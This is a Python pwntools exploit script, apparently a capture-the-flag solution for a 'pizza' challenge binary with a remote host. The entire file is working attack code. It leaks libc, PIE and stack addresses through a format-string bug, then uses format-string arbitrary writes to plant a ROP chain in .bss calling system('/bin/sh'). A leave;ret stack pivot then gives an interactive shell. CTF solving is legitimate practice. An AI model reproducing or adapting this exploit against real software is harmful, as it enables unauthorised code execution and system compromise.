#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pizza_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc chall.lac.tf 31134"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}


def exec_fmt(payload):
    io = start()
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"12")
    io.sendlineafter(b"topping: ", payload)
    io.recvline()
    io.recvline()
    io.recvline()
    resp = io.recvline()
    io.close()
    return resp


# fs = FmtStr(execute_fmt=exec_fmt)
offset = 31  # fs.offset

io = start()


def leak(idx, verbose=False):
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"12")
    leak_payload = f"%{idx}$p".encode()
    io.sendlineafter(b"topping: ", leak_payload)
    io.recvline()
    io.recvline()
    io.recvline()
    leak = io.recvline().strip()
    if verbose:
        log.info(f"{idx} {leak=}")
    io.sendlineafter(b"(y/n): ", b"y")
    if not verbose:
        return int(leak, 16)
    return 0


# for i in range(1, 128):
#     leak(i, True)

libc_leak = leak(5)
libc.address = libc_leak - libc.sym["_IO_2_1_stdin_"]
log.info(f"{libc.address=:#x}")
pie_leak = leak(49)
elf.address = pie_leak - elf.sym["main"]
log.info(f"{elf.address=:#x}")
stack_leak = leak(3)
saved_rip = stack_leak + 0x148
log.info(f"{saved_rip=:#x}")


def aaw(addr, data):
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"12")
    payload = fmtstr_payload(
        offset=offset, writes={
            addr: data}, write_size='short')
    io.sendlineafter(b"topping: ", payload)
    io.sendlineafter(b"(y/n): ", b"y")


leave_ret = libc.address + 0x0011d018
pop_rdi = libc.address + 0x0017a20f
binsh_str = next(libc.search(b"/bin/sh\x00"))

rop_chain = [
    0,
    pop_rdi,
    binsh_str,
    pop_rdi + 1,
    libc.sym["system"],
]

for i in range(len(rop_chain)):
    aaw(elf.bss(0xc00) + (i * 0x8), rop_chain[i])

aaw(saved_rip - 0x8, elf.bss(0xc00))
aaw(saved_rip, leave_ret)

io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"(y/n): ", b"n")

io.interactive()
